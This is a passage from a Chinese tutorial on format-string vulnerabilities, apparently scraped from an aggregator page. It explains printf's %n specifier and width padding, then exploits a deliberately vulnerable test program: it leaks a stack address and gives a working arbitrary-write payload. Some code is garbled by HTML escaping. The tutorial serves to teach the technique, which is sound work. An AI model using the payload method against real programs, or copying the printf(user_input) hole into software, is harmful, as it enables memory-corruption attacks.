 <p>到现在，我们可以利用格式化字符串漏洞读取内存的内容，看起来好像也没什么用啊，就是读个数据而已，我们能不能利用这个漏洞修改内存信息（比如说修改返回地址）从而劫持程序执行流程呢，这需要看printf()函数的第二个特性。</p> 
 <h4># 特性二：利用%n格式符写入数据</h4> 
 <p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码：</p> 
 <div> 
  <pre class="prettyprint">#include &amp;lt;stdio.h&amp;gt;main(){ int num=66666666; printf(&quot;Before: num = %d\n&quot;, num); printf(&quot;%d%n\n&quot;, num, &amp;amp;num); printf(&quot;After: num = %d\n&quot;, num);}</pre> 
  <pre class="prettyprint">#include &lt;stdio.h&gt;
main()
{
  intnum=66666666;
 
  printf(&quot;Before: num = %d\n&quot;,num);
  printf(&quot;%d%n\n&quot;,num,#);
  printf(&quot;After: num = %d\n&quot;,num);
 
}</pre> 
 </div> 
 <p>可以发现我们用%n成功修改了num的值：</p> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ ./format2Before: num = 6666666666666666After: num = 8</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$./format2
Before:num=66666666
66666666
After:num=8</pre> 
 </div> 
 <p>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且可以利用%n向内存中写入值，那我们是不是可以修改某一个函数的返回地址从而控制 程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是 很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p> 
 <h4># 特性三：自定义打印字符串宽度</h4> 
 <p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。我们把上一段代码做一下修改并看一下效果：</p> 
 <div> 
  <pre class="prettyprint">#include &amp;lt;stdio.h&amp;gt;main(){ int num=66666666; printf(&quot;Before: num = %d\n&quot;, num); printf(&quot;%.100d%n\n&quot;, num, &amp;amp;num); printf(&quot;After: num = %d\n&quot;, num);}</pre> 
  <pre class="prettyprint">#include &lt;stdio.h&gt;
main()
{
  intnum=66666666;
 
  printf(&quot;Before: num = %d\n&quot;,num);
  printf(&quot;%.100d%n\n&quot;,num,#);
  printf(&quot;After: num = %d\n&quot;,num);
}</pre> 
 </div> 
 <p>可以看到我们的num值被改为了100</p> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ ./format2Before: num = 666666660000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666After: num = 100</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$./format2
Before:num=66666666
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
66666666
After:num=100</pre> 
 </div> 
 <p>看到这儿聪明的你肯定明白如何去覆盖一个地址了吧，比如说我们要把0x8048000这个地址写入内存，我们要做的就是把该地址对应的10进制134512640作为格式符控制宽度即可：</p> 
 <div> 
  <pre class="prettyprint">printf(&quot;%.134512640d%n\n&quot;, num, &amp;amp;num);printf(&quot;After: num = %x\n&quot;, num);</pre> 
  <pre class="prettyprint">printf(&quot;%.134512640d%n\n&quot;,num,#);
printf(&quot;After: num = %x\n&quot;,num);</pre> 
 </div> 
 <p>可以看到，我们的num被成功修改为8048000</p> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ ./format2Before: num = 66666666中间的0省略...........00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666After: num = 8048000bingtangguan@ubuntu:~/Desktop/format$</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$./format2
Before:num=66666666
中间的0省略...........
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666
After:num=8048000
bingtangguan@ubuntu:~/Desktop/format$</pre> 
 </div> 
 <p>明白了这个原理之后，我们接下来尝试</p> 
 <div>
  任意地址写
 </div> 
 <p>作为本章的结束。知识库之前有一篇格式化字符串漏洞文章，在文章最后有一个实例，但是在我按照作者的方法进行测试的时候，发现并不能成功利用，于是我利用任意地址写的方法完成该实验。</p> 
 <p> <a href="http://drops.wooyun.org/binary/7714" target="_blank" rel="nofollow,noindex">代码参考链接：</a> </p> 
 <div> 
  <pre class="prettyprint">#include &amp;lt;stdio.h&amp;gt;int main(void){ int flag = 0;int *p = &amp;amp;flag; char a[100];scanf(&quot;%s&quot;,a);printf(a);if(flag == 2000) { printf(&quot;good!!\n&quot;); } return 0;}</pre> 
  <pre class="prettyprint">#include &lt;stdio.h&gt;
intmain(void)
{
intflag=0;
int*p=&amp;flag;
chara[100];
scanf(&quot;%s&quot;,a);
printf(a);
if(flag==2000)
    {
            printf(&quot;good!!\n&quot;);
    }
 
    return0;
}</pre> 
 </div> 
 <p> 首先分析一下汇编代码，下面这一段代码就是将 <em>p指向flag，并且将局部变量flag、</em> p压栈，我们只需要利用格式化字符串漏洞覆盖掉*p指向的内存地址的内容为2000就可以了。 </p> 
 <div> 
  <pre class="prettyprint">80484ac: c7 45 f0 00 00 00 00 movl $0x0,-0x10(%ebp) 80484b3: 8d 45 f0 lea -0x10(%ebp),%eax 80484b6: 89 45 f4 mov %eax,-0xc(%ebp</pre> 
  <pre class="prettyprint">80484ac:  c745f000000000    movl  $0x0,-0x10(%ebp)
80484b3:  8d45f0                lea    -0x10(%ebp),%eax
80484b6:  8945f4                mov    %eax,-0xc(%ebp</pre> 
 </div> 
 <p>下面我们要做到是找到*p指向的内存地址，也就是ebp-0x10的地址。 gdb载入程序，重点关注以上三条指令执行结果：</p> 
 <div> 
  <pre class="prettyprint">&amp;gt;&amp;gt;&amp;gt; x/10x $ebp-0x100xbffff048: 0x00000000 0xb7e4977d 0xb7fc13c4 0xbffff0700xbffff058: 0x00000000 0xb7e31a83 0x08048510 0x000000000xbffff068: 0x00000000 0xb7e31a83</pre> 
  <pre class="prettyprint">&gt;&gt;&gt;x/10x$ebp-0x10
0xbffff048:0x00000000  0xb7e4977d  0xb7fc13c4  0xbffff070
0xbffff058:0x00000000  0xb7e31a83  0x08048510  0x00000000
0xbffff068:0x00000000  0xb7e31a83</pre> 
 </div> 
 <p>现在我们知道了，我们需要将0xbffff048这个地址的内容修改为2000。这里有一点需要特别注意：</p> 
 <div> 
  <p>gdb调试环境里面的栈地址跟直接运行程序是不一样的</p> 
 </div> 
 <p>,也就是说我们在直接运行程序时修改这个地址是没用的，所以我们需要结合格式化字符串漏洞读内存的功能，先泄露一个地址出来，然后我们根据泄露出来的地址计算出ebp-0x10的地址。</p> 
 <p>我们继续在gdb调试，执行get()函数后随便输入AAAAAAA，执行到printf()的时候观察栈区：</p> 
 <p> <img src="http://img0.tuicool.com/IfAJZbe.png!web" class="alignCenter" /> </p> 
 <p>我们如果只输入%x的话就可以读出esp+4地址上的数据，也就是0xbfffefe4，而我们需要修改的地址为0xbffff048，这两个地址的偏移为0x64。</p> 
 <p>下面我们就可以直接运行程序，并输入%x，然后获取ESP+4地址内的值：</p> 
 <div> 
  <pre>bingtangguan@ubuntu:~/Desktop/format$ ./test%xbffff024</pre> 
  <pre>bingtangguan@ubuntu:~/Desktop/format$./test
%x
 
bffff024</pre> 
 </div> 
 <p>那我们需要修改的地址就是：0xbffff024+0x64=0xbffff088</p> 
 <p>最后就是要在地址0xbffff088处写入2000： \x88\xf0\xff\xbf%10x%10x%10x%1966x%n</p> 
 <div> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$ python -c &quot;print '\x88\xf0\xff\xbf%10x%10x%10x%.1966x%n'&quot; &amp;gt; 11bingtangguan@ubuntu:~/Desktop/format$ cat 11 | ./test ���� bffff024 0 000000000000000000000000000000000000000000000000</pre> 
  <pre class="prettyprint">bingtangguan@ubuntu:~/Desktop/format$python-c&quot;print '\x88\xf0\xff\xbf%10x%10x%10x%.1966x%n'&quot;&gt;11
bingtangguan@ubuntu:~/Desktop/format$cat11|./test
����  bffff024        0        000000000000000000000000000000000000000000000000</pre> 
 </div> 
</div>
        </div>
        <div class="article_social">
         <div class="article_like">
    <div class="circle circle-like" id="my_zan" data_id="IniyYzA">  </div>

</div>
        <div id="share_weixin_image">
            <img width="100px" height="100px" src="http://s.jiathis.com/qrcode.php?url=http://www.tuicool.com/articles/IniyYzA?via=wechat_qr">
        </div>
<div class="article_share_fav">
    <div class="share" id="ckepop">
        <span>分享</span>
        <button class="share_weibo" id="share_weibo_id"  title="分享到新浪微博"></button>
        <button class="share_qq" id="share_qq_id"  title="分享到QQ空间"></button>
        <button class="share_weixin" id="share_weixin_id"></button>
    </div>
    <div class="fav_correct">
        <button id="my_fav" data_id="IniyYzA">
            <i class="icon icon-star-empty"></i> <span id="fav_tip">收藏</span>
        </button>
        <button id="article-correct" data_id="IniyYzA" uid="462071652">
            <i class="icon icon-warning-sign"></i>
            <span>纠错</span>
        </button>
    </div>
</div>
<script type="text/javascript">
$("#share_weibo_id").click( function() {
   window.open("http://share.baidu.com/s?type=text&searchPic=0&sign=on&to=tsina&url=http://www.tuicool.com/articles/IniyYzA&title=%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2++%28%E5%88%86%E4%BA%AB%E8%87%AA+%40%E6%8E%A8%E9%85%B7%E7%BD%91%29&key=3113829255");
});
$("#share_qq_id").click( function() {
   window.open("http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.tuicool.com/articles/IniyYzA&title=%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2&desc=&summary=&site=");
});
$("#share_weixin_id").click( function() {
  $("#share_weixin_image").toggle();
});
</script>


        </div>
        <div id="site_articles" style="clear:both;">
              <div class="article-part-title">
                <span>推荐文章</span>
              </div>
          <ul class="side_article_list">
                <li class="side_article_list_item">
                    1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛">
                    掌握这17个tar命令实例让你秒变大牛
                    </a>
                </li>
                <li class="side_article_list_item">
                    2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数">
                    实例详解 Linux 中的 fork() 函数
                    </a>
                </li>
                <li class="side_article_list_item">
                    3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试">
                    每日一博 | 关于 CPU 亲和性的测试
                    </a>
                </li>
                <li class="side_article_list_item">
                    4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9">
                    SIGKILL信号linux下kill进程 -9
                    </a>
                </li>
                <li class="side_article_list_item">
                    5.<a href="/articles/j6Bfuqv" target="_blank" title="堡垒跳板机实现——架构实现">
                    堡垒跳板机实现——架构实现
                    </a>
                </li>
                <li class="side_article_list_item">
                    6.<a href="/articles/FNjAvab" target="_blank" title="ELF文件格式分析">
                    ELF文件格式分析
                    </a>
                </li>
          </ul>
        </div>
        <div id="kan_articles"></div>
        <div id="article_weibo" style="display:none;">
            <div class='article-part-title'>
                <span>相关微博</span>
                <sub>
                    <a href="/articles/weibo_list/IniyYzA" target="_blank">(<i id="weibo_num"></i>)</a> 
               </sub>
            </div>
            <div class="related-weibo-list"></div>
        </div>
        <div class="comments">
    <div class="comments-area">
    <div class="comments-header">
        <h5>我来评几句</h5>
        <div class="alert comment-alert alert-error" style="display:none;">
            错误
        </div>
           <textarea name="comment[body]" id="comment-body" cols="60" rows="6" placeholder="请输入评论内容..." style="resize: none;"></textarea>
           <a href="javascript:commentsub();" class="btn btn-medium btn-submit" id="comment-submit">发表评论</a>
        <p style="margin-top: 5px;margin-left:10px;">
            已发表评论数(<span class="comment_cnt"></span>)
        </p>
    </div>
    <div class="comments-list">
        <div class="empty-cmts alert alert-success" style="display:none;">
            没有更多评论了^^
        </div>
    </div>
    <div class="more-comments" style="display:none;">
        <a href="">更多评论</a>
    </div>
    <div class="load-fail">
        评论加载失败，<a href="javascript:reload_comments('IniyYzA',1,0,1);">重新加载</a>
        <img src="http://static1.tuicool.com//images/spinner.gif" id="spinner3"/>
    </div>
    </div>
</div>

    </div>
        <div class="span4 article_right_side">
            <div class="article_related_site article_detail_bg">
    <h4 class="article-part-title">相关站点</h4>
    <div class="article_related_site_body clearfix">
        <div class="logo">
            <img src="http://stimg0.tuicool.com/juMZbu.png"/>
        </div>
        <div class="name">
            <div>
                <a href="/sites/juMZbu" target="_blank"> 安全盒子</a>
            </div>
            <div>
                <div class="btn btn-success right_site_follow" id="my_follow" data_id="juMZbu">＋订阅</div>
            </div>
        </div>
    </div>
</div>

<div id="right_site_articles" class="article_detail_bg">
    <div class="article-part-title">
        <span>热门文章</span>
    </div>
    <ul class="side_article_list">
        <li class="side_article_list_item">
            1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛"> 掌握这17个tar命令实例让你秒变大牛 </a>
        </li>
        <li class="side_article_list_item">
            2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数"> 实例详解 Linux 中的 fork() 函数 </a>
        </li>
        <li class="side_article_list_item">
            3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试"> 每日一博 | 关于 CPU 亲和性的测试 </a>
        </li>
        <li class="side_article_list_item">
            4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9"> SIGKILL信号linux下kill进程 -9 </a>
        </li>
        <li class="side_article_list_item">
            5.<a href="/articles/Z3UBvm6" target="_blank" title="GPG 密鑰的「正確」用法"> GPG 密鑰的「正確」用法 </a>
        </li>
    </ul>
</div>
<div class="right-link">
      <a href="https://www.jiguang.cn/devservice/?from=tuicool01" target="_blank"><img src="http://static1.tuicool.com/images/upload/jpush120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.teambition.com/?utm_source=tuicool&utm_medium=banner01" target="_blank"><img src="http://static2.tuicool.com/images/upload/teambition120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.jiandaoyun.com/?f=tc" target="_blank"><img src="http://static0.tuicool.com/images/upload/jiandaoyun120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 0px">
      <a href="http://click.aliyun.com/m/6128/" target="_blank"><img src="http://static1.tuicool.com/images/upload/aliyun120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="http://www.toushibao.com/landing.html?utm_source=tuicoolwenzhang&utm_medium=guanggao&utm_campaign=tuicoolwenzhang.guanggao.tsbxgn" target="_blank"><img src="http://static1.tuicool.com/images/upload/jiankongbao120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="http://www.handone.com/?f=tc" target="_blank"><img src="http://static1.tuicool.com/images/upload/handone300.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.daocloud.io/cloud/voice.html?utm_source=tuicool&utm_medium=banner%20&utm_campaign=daovoicecampaign" target="_blank"><img src="http://static1.tuicool.com/images/upload/daocloud300.jpg"/></a>

</div>
<div class="frd_pos">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:250px"
     data-ad-client="ca-pub-7054762349007490"
     data-ad-slot="5705695566"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

</div>

         </div>
</div>

<div>
   <!-- add_article to kan -->
<div id="add-article-to-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-header">
    <span class="add-title">收藏到推刊</span>
    <a href="#new-kan" class="btn pull-right" data-toggle="modal">创建推刊</a>
    <i class="clearfix"></i>
  </div>
  <div class="modal-body">
    <ul id="add-kan-list">
    </ul>
  </div>
  <div class="modal-footer">
    <input type="hidden" value="IniyYzA" class="article-id" /> 
    <button class="btn btn-primary pull-left add-to-btn">  收 藏  </button>
    <button class="btn" data-dismiss="modal" aria-hidden="true" style="margin-right: 15px">取消</button>
  </div>
</div>

   <div id="new-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-body">
    <input type="text" name="name" id="new-kan-name"  placeholder="推刊名(必填)" required data-validation-required-message="请填写推刊名" />
    <span class="new-ness-name">请填写推刊名</span>
    <br/>
    <textarea name="desc" id="desc" rows="6" placeholder="推刊描述"></textarea>
    <span class="new-ness-desc">描述不能大于100个字符!</span>
    <br/>
    权限设置：<input type="radio" name="type" value="1" checked="checked" /> 公开
    <input type="radio" name="type" value="0"> 仅自己可见
  </div>
  <div class="modal-footer">
    <button class="btn btn-primary pull-left create-kan-btn" disabled>创建</button>
    <button class="btn dismiss-new-kan" data-dismiss="modal" aria-hidden="true">取消</button>
  </div>
</div>


</div>
<div id="article-correct-modal" class="modal hide fade in" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
            &times;
        </button>
        <h3>文章纠错</h3>
    </div>
    <div class="modal-body">
        <input type="hidden" value="IniyYzA" id="article-correct-source">
        <div>
            <label for="article-correct-select">
                错误类型
            </label>
            <select id="article-correct-select">
                <option value="正文不准确">正文不准确</option>
                <option value="标题不准确">标题不准确</option>
                <option value="排版有问题">排版有问题</option>
                <option value="排版有问题">主题不准确</option>
                <option value="没有分页内容">没有分页内容</option>
                <option value="图片无法显示">图片无法显示</option>
                <option value="视频无法显示">视频无法显示</option>
                <option value="与原文不一致">与原文不一致</option>
            </select>
        </div>
        <div>
            <label for="article-correct-other">
                补充信息
            </label>
            <textarea id="article-correct-other" class="span4"></textarea>
        </div>
    </div>
    <div class="modal-footer">
        <button class="btn btn-primary pull-right huodong_correct_submit" id="article-correct-submit">
            &nbsp;&nbsp;提交&nbsp;&nbsp;
        </button>
    </div>
</div>
    <div class="share_zone">
    <div class="bdsharebuttonbox"> 
         <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
        <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
        <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
        <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a>
        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
        <a href="#" class="bds_more" data-cmd="more"></a>
     </div>
    <script>
        window._bd_share_config = {
            "common" : {
                "bdSnsKey" : {
                    "tsina" : "3113829255",
                    "tqq" : "801536792"
                },
                "bdText" : "漏洞挖掘基础之格式化字符串 (分享自 @推酷网)",
                "bdMini" : "2",
                "bdMiniList" : false,
                "bdPic" : "http://aimg0.tuicool.com/3muEr2R.jpg",
                "bdStyle" : "1",
                "bdSize" : "24"
            },
            "slide" : {
                "type" : "slide",
                "bdImg" : "1",
                "bdPos" : "left",
                "bdTop" : "200"
            }
        };
        with (document)
        0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
    </script>
</div>

<style type="text/css">
    .btn-large {
        padding: 0;
    }
    .load-fail {
        display: none;
    }
</style>
<script src="http://static1.tuicool.com//assets/highlight.pack.js"></script>
<script type="text/javascript">
    $('table').each(function(i) {
        var size = $(this).children().size();
        if (size > 1) {
            $(this).attr('class',"table table-bordered");
        } else if (size == 1) {
            var e11 = $(this).children(":first");
            var e1 = e11[0];
            var name = e1.nodeName.toLowerCase();
            if ("tbody" == name) {
                if (e1.children.length > 1) {
                    $(this).attr('class',"table table-bordered");
                } else if (e1.children.length == 1){
                    var e12 = e1.children[0];
                    var name2 = e12.nodeName.toLowerCase();
                    if ("tr" == name2) {
                       if (e12.children.length > 1) {
                         $(this).attr('class',"table table-bordered");
                       }
                    }
                }
            }
        }
    });
            related_kan("IniyYzA");
        window.page = 0;
        window.last = 0;    
        window.first = true;
        resize_article_image('#nei', 550);
                load_comments("IniyYzA",1,0,"MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451");
                window.uid = parseInt("155792");
        open_add_article_to_kan("true");
        async_do_zan_article(); 
        $('pre').each(function(i, e) {
            hljs.highlightBlock(e, "<span class='indent'>  </span>", false)
        });
       
          function commentsub(){  
    $.ajaxSetup({
    error:function(x,e){        
      $('.comment-alert').text("系统出现问题，请稍候再试").show();
      $('textarea').attr('disabled',false);
      return false;
    },
    headers: {
      'X-CSRF-Token': $('meta[name="csrf-token"]').attr('content')
    }
  }); 
    $("#comment-body").attr("disabled",true);
    $("#comment-submit").addClass("disabled");
    $("#comment-submit").attr("href","#comment-body");
    text = $("#comment-body").val();
    if(text.length < 2 ){
        $('.comment-alert').text("你的字数太少了").show();
        reset_submit_btn();
    }else if(text.length > 500){
        $('.comment-alert').text("你的字数太多了,不能超过500字!").show();
        reset_submit_btn();
    }else{      
    $.post("/comments.json", { aid: "IniyYzA", html_body: $("#comment-body").val(), auth: "MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451"},function(data){
      if(data.success == true){
        $(".comments-list").show();
        var aComment = data.comment;
        var text = aComment.content;
        var id = "IniyYzA";
        var title = "漏洞挖掘基础之格式化字符串";
        var share_code = "<ul class='dropdown-menu'><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tsina&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>新浪微博</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tqq&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @tuicool）'>腾讯微博</a></li><li><a target='blank' href='http://s.evernote.com/grclip?url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>印象笔记</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=douban&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>豆瓣</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=renren&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>人人网</a></li></ul>"
        $(".comments-list").prepend("<div class='single' id='c-"+aComment.id+"'><img src='"+aComment.avatar+"' class='img avatar'><div class='comment-item' style='padding:0 0 0 5px;'><div class='info mine'>"+"<a class='uname' href='/user/"+ aComment.uid+ "' target='_blank'>"+ aComment.username  +"</a>" +"<span class='timestamp'>" +aComment.timestamp +"</span> <div class='reply dropdown'><a class='dropdown-toggle share' data-toggle='dropdown' href='javascript:share("+aComment.id+");'>分享<b class='caret'></b></a> | <a href='javascript:reply(\""+aComment.username+"\");'>回复</a>"+share_code+"</div> "+ "</div><div class='body' id='comment-"+aComment.id+"'>" + aComment.content + "</div></div></div>");
        $("#comment-body").attr("disabled",false).val("");
        $("#comment-submit").removeClass("disabled");
        $("#comment-submit").attr("href","javascript:commentsub();");
        location = "#c-"+aComment.id
        $('.empty-cmts').hide();
        $('.comment-alert').hide();
        $('.comment_cnt').text(parseInt($('.comment_cnt').text())+1);
       } else{
        $('.comment-alert').text(data.error).show();
        reset_submit_btn();
       }
    },"json");
    }
}
function reset_submit_btn() {
  $('textarea').attr('disabled',false);
  $("#comment-submit").removeClass("disabled");
  $("#comment-submit").attr("href","javascript:commentsub();");
}

       handle_follow_site("#my_follow","已订阅","+ 订阅");
</script>


    <div class="loader-inner ball-pulse ball-loading-center" id="page-loading" style="display: none">
      <div></div>
      <div></div>
      <div></div>
    </div>
    <div class="read-later-alert"></div>
  </div>

    <div class="footer">
    <div class="footer-inner">
    <dl class="about-link site-link">
        <dt>
            网站相关
        </dt>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/about">关于我们</a>
        </dd>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/mobile">移动应用</a>
        </dd>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/bbs/go/issues">建议反馈</a>
        </dd>
    </dl>
    <dl class="site-link follow-link">
        <dt>
            关注我们
        </dt>
        <dd>
            <a target="_blank" href="http://e.weibo.com/tuicool2012"><img src="http://static1.tuicool.com/images/weibo-32.png">推酷网</a>
        </dd>
        <dd><img src="http://static1.tuicool.com/images/weixin-32.png">tuicool2012
        </dd>
    </dl>
    <dl class="site-link links">
        <dt>
            友情链接
        </dt>
        <dd>
                <a href="http://www.woshipm.com/" title="人人都是产品经理" target="_blank">人人都是产品经理</a>
                <a href="http://www.pm265.com/" title="PM256" target="_blank">PM256</a>
                <a href="http://www.yidonghua.com/" title="移动信息化" target="_blank">移动信息化</a>
                <a href="http://www.snsiu.com/" title="行晓网" target="_blank">行晓网</a>
                <a href="http://www.taskcity.com/" title="智城外包网" target="_blank">智城外包网</a>
                <a href="http://www.huxiu.com/" title="虎嗅" target="_blank">虎嗅</a>
                <a href="http://www.iterduo.com/" title="IT耳朵" target="_blank">IT耳朵</a>
                <a href="http://mediaworks.caixin.com/" title="创媒工场" target="_blank">创媒工场</a>
                <a href="http://www.managershare.com/" title="经理人分享" target="_blank">经理人分享</a>
                <a href="http://www.shichangbu.com/" title="市场部网" target="_blank">市场部网</a>
                <a href="http://www.ikanchai.com/" title="砍柴网" target="_blank">砍柴网</a>
                <a href="http://www.cocoachina.com/" title="CocoaChina" target="_blank">CocoaChina</a>
                <a href="http://www.ibeifeng.com/" title="北风网" target="_blank">北风网</a>
                <a href="http://www.jiankongbao.com/" title="云智慧" target="_blank">云智慧</a>
                <a href="http://www.wyzc.com" title="我赢职场" target="_blank">我赢职场</a>
                <a href="http://www.thebigdata.cn/" title="大数据时代" target="_blank">大数据时代</a>
                <a href="http://www.qidic.com/" title="奇笛网" target="_blank">奇笛网</a>
                <a href="http://www.cngulu.com/" title="咕噜网" target="_blank">咕噜网</a>
                <a href="http://www.linuxdiyf.com/" title="红联linux" target="_blank">红联linux</a>
                <a href="http://win10.ithome.com" title="Win10之家" target="_blank">Win10之家</a>
                <a href="http://www.niaogebiji.com/" title="鸟哥笔记" target="_blank">鸟哥笔记</a>
                <a href="http://www.play.cn" title="爱游戏" target="_blank">爱游戏</a>
                <a href="http://www.investide.cn/" title="投资潮" target="_blank">投资潮</a>
                <a href="http://www.31huiyi.com/" title="31会议网" target="_blank">31会议网</a>
                <a href="https://www.jiguang.cn/" title="极光推送" target="_blank">极光推送</a>
                <a href="https://www.teambition.com/" title="Teambition" target="_blank">Teambition</a>
                <a href="http://www.guigu.org/" title="硅谷网" target="_blank">硅谷网</a>
                <a href="https://home.leangoo.com/" title="leangoo" target="_blank">leangoo</a>
                <a href="http://www.zealer.com/" title="ZEALER中国" target="_blank">ZEALER中国</a>
                <a href="http://www.opensns.cn/" title="OpenSNS" target="_blank">OpenSNS</a>
                <a href="http://www.edu360.cn/" title="小牛学堂" target="_blank">小牛学堂</a>
                <a href="http://www.handone.com/" title="handone" target="_blank">handone</a>
                <a href="http://www.scrumcn.com/" title="Scrum中文网" target="_blank">Scrum中文网</a>
                <a href="http://www.bigniu.com/" title="比戈大牛" target="_blank">比戈大牛</a>
                <a href="https://www.upyun.com/" title="又拍云" target="_blank">又拍云</a>
            <a href="/links">更多链接>></a>&nbsp;&nbsp;
        </dd>
    </dl>
    <div class="clear"></div>
    </div>
</div>

<div style="display:none;">
   <script src="http://s22.cnzz.com/stat.php?id=5541078&web_id=5541078&show=pic" language="JavaScript"></script>
</div>


</body>
</html>
